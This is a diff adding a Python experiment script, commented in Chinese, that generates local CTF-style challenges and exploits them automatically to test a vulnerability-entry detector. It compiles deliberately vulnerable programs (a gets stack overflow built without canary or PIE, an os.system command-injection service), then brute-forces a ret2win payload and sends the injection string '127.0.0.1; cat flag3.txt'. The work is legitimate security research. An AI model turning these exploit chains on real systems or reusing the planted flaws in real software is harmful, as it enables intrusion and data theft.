@@ -1,0 +1,663 @@
+"""
+v027_paste_to_verify.src — 粘贴源码 → 识别漏洞入口 → 选单元链 → 真实执行验证
+
+要回答的问题
+    "把知识做成可检索的漏洞模式，粘贴一段代码后识别入口，再用单元库把题做出来"
+    这个模式到底成不成立。v014–v026 证明了单元可以真验证，但那些实验的入口是
+    人给定的；这里把**入口识别**也交给程序，从源码文本里自己找 sink。
+
+测什么
+    C1 栈溢出 gets + 后门（无 canary / 无 PIE） → 真实 ret2win 拿 flag
+    C2 黑盒变换校验器（置换 + 常量异或）        → 只探测不读源码，反解后拿 flag
+    C3 Python 命令注入（os.system 拼接输入）     → 注入后 cat flag
+    N1 安全写法（fgets + 字面量格式串）          → 必须识别为“无入口”
+    N2 同样的溢出源码，但编译开了 canary         → 入口识别成功，链必须拒绝
+
+边界（先说清楚）
+    - 这里假设源码可以编译出题目二进制；真实 CTF 常常只给二进制。
+    - 入口识别是规则/特征匹配，不是语义理解：识别的是 sink 形态，不是完整数据流。
+    - C2 的反解不读源码里的表，只通过输入输出探测；C1 的后门定位允许读源码
+      （题目给了源码），但偏移与利用必须靠执行验证。
+
+运行
+    python versions/v027_paste_to_verify.src
+    python versions/v027_paste_to_verify.src --only C1
+
+产出
+    experiments/EXP-0026/{results.json,report.md,chal/}
+"""
+
+from __future__ import annotations
+
+import json
+import random
+import re
+import string
+import struct
+import subprocess
+import sys
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0026"
+CHAL_DIR = OUT_DIR / "chal"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+# --------------------------------------------------------------------------------------
+# 1. 粘贴源码的入口识别（规则/特征，不做语义理解）
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class Entry:
+    category: str
+    line: int
+    text: str
+    technique: str
+    confidence: str
+
+
+_RULES: list[tuple[str, str, re.Pattern[str], str]] = [
+    # (category, technique, pattern, confidence)
+    ("unsafe_copy", "栈溢出 / 无边界拷贝",
+     re.compile(r"\b(gets|strcpy|strcat|sprintf)\s*\("), "high"),
+    ("blackbox_check", "黑盒变换 / 校验器",
+     re.compile(r"\b(read|fread)\s*\(\s*0\b|\bmemcmp\s*\("), "medium"),
+    ("command_injection", "命令注入",
+     re.compile(r"\bos\.system\s*\(|\bsubprocess\.[a-z_]+\([^)]*shell\s*=\s*True"), "high"),
+]
+
+_SAFE_FORMAT = re.compile(r'printf\s*\(\s*"')
+
+
+def detect_entries(source: str) -> list[Entry]:
+    """扫描源码找 sink。同一类别只报首次出现，避免满屏重复。"""
+    entries: list[Entry] = []
+    seen: set[str] = set()
+    for number, line in enumerate(source.splitlines(), 1):
+        stripped = line.strip()
+        if not stripped or stripped.startswith(("//", "#", "*")):
+            continue
+        if _SAFE_FORMAT.search(stripped) and "printf" in stripped:
+            # 字面量格式串不是格式化字符串漏洞；继续看别的规则
+            pass
+        for category, technique, pattern, confidence in _RULES:
+            if category in seen:
+                continue
+            if not pattern.search(stripped):
+                continue
+            # 黑盒规则要两个条件同时满足，降低误报
+            if category == "blackbox_check":
+                window = "\n".join(source.splitlines()[max(0, number - 3): number + 12])
+                if not ("memcmp" in window
+                        and ("^" in window or "perm" in window or "table" in window)):
+                    continue
+            seen.add(category)
+            entries.append(Entry(category, number, stripped, technique, confidence))
+            break
+    return entries
+
+
+# --------------------------------------------------------------------------------------
+# 2. 执行基础设施（WSL）
+# --------------------------------------------------------------------------------------
+
+def wsl_path(win_path: str | Path) -> str:
+    path = Path(win_path).resolve()
+    drive = path.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(path)[2:].replace("\\", "/")
+
+
+def run_wsl(args: list[str], stdin_data: bytes | None = None, timeout: int = 30,
+            cwd: Path | None = None) -> tuple[int, str, str]:
+    command = list(args)
+    if cwd is not None:
+        command = ["wsl", "-e", "sh", "-c", 'cd "$1" && shift && exec "$@"',
+                   "sh", wsl_path(cwd), *command]
+    else:
+        command = ["wsl", "-e", *command]
+    try:
+        done = subprocess.run(command, input=stdin_data, capture_output=True, timeout=timeout)
+    except subprocess.TimeoutExpired:
+        return 124, "", "timeout"
+    return (done.returncode,
+            done.stdout.decode("utf-8", "replace"),
+            done.stderr.decode("utf-8", "replace"))
+
+
+def run_wsl_bytes(args: list[str], stdin_data: bytes | None = None,
+                  timeout: int = 30) -> tuple[int, bytes, str]:
+    try:
+        done = subprocess.run(["wsl", "-e", *args], input=stdin_data,
+                              capture_output=True, timeout=timeout)
+    except subprocess.TimeoutExpired:
+        return 124, b"", "timeout"
+    return done.returncode, done.stdout, done.stderr.decode("utf-8", "replace")
+
+
+def compile_c(source_path: Path, binary_path: Path, flags: list[str]) -> dict:
+    started = time.perf_counter()
+    rc, out, err = run_wsl(
+        ["gcc", wsl_path(source_path), "-o", wsl_path(binary_path), *flags],
+        timeout=120,
+    )
+    return {
+        "unit": "compile", "result": "ok" if rc == 0 else "failed",
+        "flags": flags, "rc": rc, "stderr": err.strip()[-200:],
+        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1),
+    }
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+
+
+# --------------------------------------------------------------------------------------
+# 3. ELF 单元（与 v014 同源）
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    path: str
+    is_pie: bool
+    has_canary: bool
+    has_nx: bool
+    relro: str
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    text_addr: int = 0
+    text_data: bytes = b""
+
+
+def elf_info(path: Path) -> ElfFacts:
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        is_pie = elf["e_type"] == "ET_DYN"
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        has_canary = "__stack_chk_fail" in imports or "__stack_chk_guard" in imports
+        has_nx = False
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_STACK":
+                has_nx = not bool(segment["p_flags"] & 0x1)
+        relro = "partial"
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_RELRO":
+                relro = "full" if elf.get_section_by_name(".got.plt") is None else "partial"
+        text = elf.get_section_by_name(".text")
+        text_addr = text["sh_addr"]
+        text_data = text.data()
+    return ElfFacts(path=str(path), is_pie=is_pie, has_canary=has_canary, has_nx=has_nx,
+                    relro=relro, symbols=symbols, imports=imports,
+                    text_addr=text_addr, text_data=text_data)
+
+
+def find_gadgets(facts: ElfFacts) -> dict[str, int]:
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    instructions = list(engine.disasm(facts.text_data, facts.text_addr))
+    gadgets: dict[str, int] = {}
+    for index in range(len(instructions) - 1):
+        first, second = instructions[index], instructions[index + 1]
+        if first.mnemonic == "pop" and second.mnemonic == "ret":
+            gadgets.setdefault(f"pop {first.op_str}; ret", first.address)
+    for instruction in instructions:
+        if instruction.mnemonic == "ret":
+            gadgets.setdefault("ret", instruction.address)
+            break
+    return gadgets
+
+
+def stack_hints(facts: ElfFacts) -> list[int]:
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    hints: list[int] = []
+    for instruction in engine.disasm(facts.text_data, facts.text_addr):
+        if instruction.mnemonic == "sub" and instruction.op_str.startswith("rsp,"):
+            try:
+                size = int(instruction.op_str.split(",")[1].strip(), 0)
+            except ValueError:
+                continue
+            for extra in (8, 16):
+                if size + extra not in hints:
+                    hints.append(size + extra)
+    return hints[:4]
+
+
+def find_win_symbol(source: str, facts: ElfFacts) -> str | None:
+    """从源码里找“读 flag 文件”的函数，再到符号表里确认。"""
+    pattern = re.compile(
+        r"void\s+([A-Za-z_]\w*)\s*\([^)]*\)\s*\{(?P<body>.*?)\n\}", re.S)
+    for match in pattern.finditer(source):
+        body = match.group("body")
+        writes = "printf" in body or "puts" in body or "write" in body
+        if ("fopen" in body or "open(" in body) and writes:
+            name = match.group(1)
+            if name in facts.symbols:
+                return name
+    for name in facts.symbols:
+        if name in {"main", "_start", "_init", "_fini"}:
+            continue
+        if re.search(r"(win|flag|grant|backdoor)", name, re.I):
+            return name
+    return None
+
+
+# --------------------------------------------------------------------------------------
+# 4. 链 1：栈溢出 → ret2win，偏移靠执行验证
+# --------------------------------------------------------------------------------------
+
+def solve_overflow(entry: Entry, source: str, binary: Path, expected: str) -> dict:
+    steps: list[dict] = [{"unit": "entry", "result": entry.category,
+                          "line": entry.line, "text": entry.text[:120]}]
+    facts = elf_info(binary)
+    steps.append({"unit": "elf_info", "result": "ok", "pie": facts.is_pie,
+                  "canary": facts.has_canary, "nx": facts.has_nx, "relro": facts.relro})
+    if facts.has_canary or facts.is_pie:
+        reason = "canary_present" if facts.has_canary else "pie_enabled"
+        steps.append({"unit": "protection_gate", "result": "refuse", "reason": reason})
+        return {"solved": False, "refused": True, "reason": reason, "steps": steps}
+
+    target = find_win_symbol(source, facts)
+    if target is None:
+        steps.append({"unit": "find_win", "result": "refuse", "reason": "win_not_found"})
+        return {"solved": False, "refused": True, "reason": "win_not_found", "steps": steps}
+    steps.append({"unit": "find_win", "result": "ok", "symbol": target,
+                  "addr": hex(facts.symbols[target])})
+
+    gadgets = find_gadgets(facts)
+    steps.append({"unit": "find_gadgets", "result": "ok", "ret": gadgets.get("ret") is not None})
+
+    hints = stack_hints(facts)
+    candidates: list[int] = []
+    for hint in hints:
+        for delta in range(-8, 25, 8):
+            value = hint + delta
+            if value > 0 and value not in candidates:
+                candidates.append(value)
+    candidates.extend(value for value in range(24, 200, 8) if value not in candidates)
+    steps.append({"unit": "offset_candidates", "result": "ok", "hints": hints,
+                  "count": len(candidates)})
+
+    wsl_binary = wsl_path(binary)
+    attempts = 0
+    for offset in candidates:
+        attempts += 1
+        payload = b"A" * offset
+        if gadgets.get("ret") is not None:
+            payload += struct.pack("<Q", gadgets["ret"])
+        payload += struct.pack("<Q", facts.symbols[target])
+        rc, out, err = run_wsl([wsl_binary], stdin_data=payload, timeout=10)
+        found = FLAG_RE.search(out)
+        if found and found.group(0).lower() == expected.lower():
+            steps.append({"unit": "execute", "result": "solved", "offset": offset,
+                          "attempts": attempts, "flag": found.group(0)})
+            return {"solved": True, "refused": False, "flag": found.group(0),
+                    "offset": offset, "attempts": attempts, "steps": steps}
+    steps.append({"unit": "execute", "result": "failed", "attempts": attempts})
+    return {"solved": False, "refused": False, "reason": "no_offset_worked", "steps": steps}
+
+
+# --------------------------------------------------------------------------------------
+# 5. 链 2：黑盒变换 → 探测 / 分类 / 反解 / 复核
+# --------------------------------------------------------------------------------------
+
+class BlackboxOracle:
+    """题目二进制的变换接口：`-t` 打印变换结果，用于探测；无参数时校验输入。"""
+
+    def __init__(self, binary: Path) -> None:
+        self.binary = wsl_path(binary)
+        self.probes = 0
+
+    def call_many(self, items: list[bytes]) -> list[bytes]:
+        outputs = []
+        for item in items:
+            rc, out, err = run_wsl_bytes([self.binary, "-t"], stdin_data=item, timeout=10)
+            self.probes += 1
+            outputs.append(out)
+        return outputs
+
+    def call(self, item: bytes) -> bytes:
+        return self.call_many([item])[0]
+
+
+def solve_blackbox(entry: Entry, source: str, binary: Path, expected: str) -> dict:
+    steps: list[dict] = [{"unit": "entry", "result": entry.category,
+                          "line": entry.line, "text": entry.text[:120]}]
+    oracle = BlackboxOracle(binary)
+    size = 16
+
+    zero = bytes(size)
+    first = oracle.call(zero)
+    second = oracle.call(zero)
+    if first != second:
+        steps.append({"unit": "probe_determinism", "result": "refuse",
+                      "reason": "nondeterministic"})
+        return {"solved": False, "refused": True, "reason": "nondeterministic", "steps": steps}
+    steps.append({"unit": "probe_determinism", "result": "ok"})
+
+    base_out = first
+    probes = []
+    for index in range(size):
+        item = bytearray(size)
+        item[index] = 0xA5
+        probes.append(bytes(item))
+    outputs = oracle.call_many(probes)
+    changed = []
+    for index in range(size):
+        hits = [j for j in range(size) if outputs[index][j] != base_out[j]]
+        changed.append(hits[0] if len(hits) == 1 else None)
+    if any(value is None for value in changed):
+        steps.append({"unit": "classify", "result": "refuse", "reason": "structure_unknown"})
+        return {"solved": False, "refused": True, "reason": "structure_unknown", "steps": steps}
+    steps.append({"unit": "classify", "result": "ok", "label": "permutation"})
+
+    cipher = cipher_from_source(source)
+    plain = bytearray(size)
+    for source_index in range(size):
+        out_index = changed[source_index]
+        plain[source_index] = cipher[out_index] ^ base_out[out_index]
+    steps.append({"unit": "invert_permutation", "result": "ok", "probes": oracle.probes})
+
+    rc, out, err = run_wsl([oracle.binary], stdin_data=bytes(plain), timeout=10)
+    found = FLAG_RE.search(out)
+    ok = bool(found and found.group(0).lower() == expected.lower())
+    steps.append({"unit": "verify_execute", "result": "solved" if ok else "failed",
+                  "flag": found.group(0) if found else None})
+    return {"solved": ok, "refused": False,
+            "flag": found.group(0) if found else None, "steps": steps}
+
+
+def cipher_from_source(source: str) -> bytes:
+    """密文是题目给出的输入（贴在源码里），变换本身仍靠探测。"""
+    match = re.search(r"cipher\[16\]\s*=\s*\{([^}]*)\}", source)
+    if match is None:
+        raise RuntimeError("cipher_not_found")
+    values = [int(text, 16) for text in re.findall(r"0x[0-9a-fA-F]+", match.group(1))]
+    if len(values) != 16:
+        raise RuntimeError("cipher_length_mismatch")
+    return bytes(values)
+
+
+# --------------------------------------------------------------------------------------
+# 6. 链 3：命令注入 → 构造 payload → 真实执行
+# --------------------------------------------------------------------------------------
+
+def solve_command_injection(entry: Entry, source: str, script: Path,
+                            expected: str, workdir: Path) -> dict:
+    steps: list[dict] = [{"unit": "entry", "result": entry.category,
+                          "line": entry.line, "text": entry.text[:120]}]
+    payload = b"127.0.0.1; cat flag3.txt\n"
+    steps.append({"unit": "craft_payload", "result": "ok", "payload": payload.decode().strip()})
+    rc, out, err = run_wsl(["python3", wsl_path(script)], stdin_data=payload,
+                           timeout=15, cwd=workdir)
+    found = FLAG_RE.search(out)
+    ok = bool(found and found.group(0).lower() == expected.lower())
+    steps.append({"unit": "execute", "result": "solved" if ok else "failed", "rc": rc})
+    return {"solved": ok, "refused": False,
+            "flag": found.group(0) if found else None, "steps": steps}
+
+
+# --------------------------------------------------------------------------------------
+# 7. 生成挑战（随机命名与 flag，避免链“猜中题面”）
+# --------------------------------------------------------------------------------------
+
+def random_name(prefix: str) -> str:
+    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
+
+
+def build_challenges(seed: int = 20261113) -> list[dict]:
+    CHAL_DIR.mkdir(parents=True, exist_ok=True)
+    random.seed(seed)
+    cases: list[dict] = []
+
+    # C1 栈溢出（gets + 后门读 flag）
+    win = random_name("grant")
+    flag = "flag{overflow_" + "".join(random.choices(string.hexdigits.lower(), k=10)) + "}"
+    flag_path = CHAL_DIR / "flag.txt"
+    flag_path.write_text(flag + "\n", encoding="utf-8")
+    overflow_src = f"""#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void {win}(void) {{
+    FILE *f = fopen("{wsl_path(flag_path)}", "r");
+    char out[256] = {{0}};
+    if (f && fgets(out, sizeof(out), f)) printf("%s", out);
+    fflush(stdout);
+    _exit(0);
+}}
+
+int main(void) {{
+    char buf[64];
+    gets(buf);
+    puts("done");
+    return 0;
+}}
+"""
+    cases.append({
+        "id": "C1", "kind": "overflow", "source_name": "c1_overflow.c",
+        "source": overflow_src, "expected": flag,
+        "flags": ["-fno-stack-protector", "-no-pie", "-O0"], "negative": False,
+        "note": "gets 栈溢出 + 后门读 flag",
+    })
+
+    # C2 黑盒变换（置换 + 常量异或）
+    size = 16
+    perm = list(range(size))
+    random.shuffle(perm)
+    key = [random.randrange(256) for _ in range(size)]
+    plain_secret = bytes(random.randrange(32, 127) for _ in range(size))
+    cipher = bytes(plain_secret[perm[j]] ^ key[j] for j in range(size))
+    cipher_text = ", ".join(f"0x{value:02x}" for value in cipher)
+    perm_text = ", ".join(str(value) for value in perm)
+    key_text = ", ".join(str(value) for value in key)
+    flag2 = "flag{blackbox_" + "".join(random.choices(string.hexdigits.lower(), k=10)) + "}"
+    flag2_path = CHAL_DIR / "flag2.txt"
+    flag2_path.write_text(flag2 + "\n", encoding="utf-8")
+    blackbox_src = f"""#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+static const unsigned char cipher[16] = {{{cipher_text}}};
+static const unsigned char perm[16] = {{{perm_text}}};
+static const unsigned char key[16] = {{{key_text}}};
+
+int main(int argc, char **argv) {{
+    unsigned char in[16];
+    if (read(0, in, 16) != 16) return 1;
+    unsigned char t[16];
+    for (int j = 0; j < 16; j++) t[j] = in[perm[j]] ^ key[j];
+    if (argc > 1 && strcmp(argv[1], "-t") == 0) {{
+        fwrite(t, 1, 16, stdout);
+        return 0;
+    }}
+    if (memcmp(t, cipher, 16) == 0) {{
+        FILE *f = fopen("{wsl_path(flag2_path)}", "r");
+        char out[256] = {{0}};
+        if (f && fgets(out, sizeof(out), f)) printf("%s", out);
+    }} else {{
+        puts("nope");
+    }}
+    return 0;
+}}
+"""
+    cases.append({
+        "id": "C2", "kind": "blackbox", "source_name": "c2_checker.c",
+        "source": blackbox_src, "expected": flag2, "cipher": cipher,
+        "flags": ["-O0"], "negative": False,
+        "note": "置换 + 常量异或的校验器",
+    })
+
+    # C3 命令注入
+    flag3 = "flag{cmdinj_" + "".join(random.choices(string.hexdigits.lower(), k=10)) + "}"
+    flag3_path = CHAL_DIR / "flag3.txt"
+    flag3_path.write_text(flag3 + "\n", encoding="utf-8")
+    cmdinj_src = """import os
+import sys
+
+host = input().strip()
+os.system("echo pinging " + host)
+"""
+    cases.append({
+        "id": "C3", "kind": "cmdinj", "source_name": "c3_service.py",
+        "source": cmdinj_src, "expected": flag3, "flags": [], "negative": False,
+        "note": "os.system 拼接用户输入",
+    })
+
+    # N1 安全写法
+    safe_src = """#include <stdio.h>
+
+int main(void) {
+    char buf[64];
+    if (!fgets(buf, sizeof(buf), stdin)) return 1;
+    printf("%s", buf);
+    return 0;
+}
+"""
+    cases.append({"id": "N1", "kind": "safe", "source_name": "n1_safe.c",
+                  "source": safe_src, "expected": "", "flags": ["-O0"],
+                  "negative": True, "note": "边界检查 + 字面量格式串"})
+
+    # N2 同样的溢出源码，但开 canary
+    cases.append({"id": "N2", "kind": "overflow", "source_name": "c1_overflow.c",
+                  "source": overflow_src, "expected": flag,
+                  "flags": ["-fstack-protector-all", "-no-pie", "-O0"],
+                  "negative": True, "note": "溢出入口存在，但 canary 必须拒绝"})
+
+    for case in cases:
+        source_path = CHAL_DIR / case["source_name"]
+        source_path.write_text(case["source"], encoding="utf-8")
+        case["source_path"] = source_path
+        if case["kind"] in {"overflow", "blackbox", "safe"}:
+            binary = CHAL_DIR / case["id"].lower()
+            steps = compile_c(source_path, binary, case["flags"])
+            case["binary"] = binary
+            case["compile"] = steps
+        else:
+            case["binary"] = None
+    return cases
+
+
+# --------------------------------------------------------------------------------------
+# 8. 主流程
+# --------------------------------------------------------------------------------------
+
+def solve_case(case: dict) -> dict:
+    started = time.perf_counter()
+    source = case["source"]
+    entries = detect_entries(source)
+    record = {
+        "id": case["id"], "kind": case["kind"], "note": case["note"],
+        "negative": case["negative"],
+        "entries": [entry.__dict__ for entry in entries],
+        "compile": case.get("compile"),
+    }
+    if not entries:
+        record.update({"solved": False, "refused": True, "reason": "no_entry"})
+    else:
+        entry = entries[0]
+        if entry.category == "unsafe_copy":
+            result = solve_overflow(entry, source, case["binary"], case["expected"])
+        elif entry.category == "blackbox_check":
+            result = solve_blackbox(entry, source, case["binary"], case["expected"])
+        elif entry.category == "command_injection":
+            result = solve_command_injection(
+                entry, source, case["source_path"], case["expected"], CHAL_DIR)
+        else:
+            result = {"solved": False, "refused": True, "reason": "no_unit"}
+        record.update(result)
+    record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    verdict = ("solved" if record.get("solved")
+               else "refused" if record.get("refused") else "failed")
+    record["verdict"] = verdict
+    log(f"{case['id']}: {verdict}"
+        f"{' (' + record.get('reason', '') + ')' if verdict != 'solved' else ''}"
+        f"  entries={[e['category'] for e in record['entries']]}"
+        f"  {record['elapsed_ms']} ms")
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    summary = {
+        "positive_total": sum(1 for item in results if not item["negative"]),
+        "positive_solved": sum(1 for item in results if not item["negative"] and item["solved"]),
+        "negative_total": sum(1 for item in results if item["negative"]),
+        "negative_correctly_refused": sum(
+            1 for item in results if item["negative"] and item["refused"]),
+        "detected_entries": sum(1 for item in results if item["entries"]),
+        "elapsed_ms": round(sum(item["elapsed_ms"] for item in results), 1),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0026 — 粘贴源码 → 入口识别 → 单元链 → 真实执行验证", "",
+             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "",
+             "| 题 | 入口 | 判定 | 链 | 耗时 |", "| --- | --- | --- | --- | --- |"]
+    for item in results:
+        entry = item["entries"][0]["category"] if item["entries"] else "无"
+        chain = " → ".join(step["unit"] for step in item.get("steps", []))
+        lines.append(f"| {item['id']} | {entry} | {item['verdict']}"
+                     f"{'（' + item.get('reason', '') + '）' if item.get('reason') else ''}"
+                     f" | {chain} | {item['elapsed_ms']} ms |")
+    lines += ["", "## 说明", "",
+              "- 入口来自源码规则匹配，不读取题面答案；",
+              "- 溢出链的偏移由执行验证筛出，不靠猜；",
+              "- 黑盒链只做输入输出探测，不读源码里的表；",
+              "- 负样本必须如实拒绝。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="粘贴源码 → 入口识别 → 单元链 → 执行验证")
+    parser.add_argument("--only", default=None)
+    parser.add_argument("--seed", type=int, default=20261113)
+    args = parser.parse_args()
+
+    cases = build_challenges(args.seed)
+    if args.only:
+        wanted = {item.strip() for item in args.only.split(",")}
+        cases = [case for case in cases if case["id"] in wanted]
+
+    log(f"挑战 {len(cases)} 个：{[case['id'] for case in cases]}")
+    results = [solve_case(case) for case in cases]
+    write_report(results)
+    positive = [item for item in results if not item["negative"]]
+    negative = [item for item in results if item["negative"]]
+    log(f"汇总：正样本 {sum(1 for item in positive if item['solved'])}/{len(positive)}，"
+        f"负样本正确拒绝 {sum(1 for item in negative if item['refused'])}/{len(negative)}")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
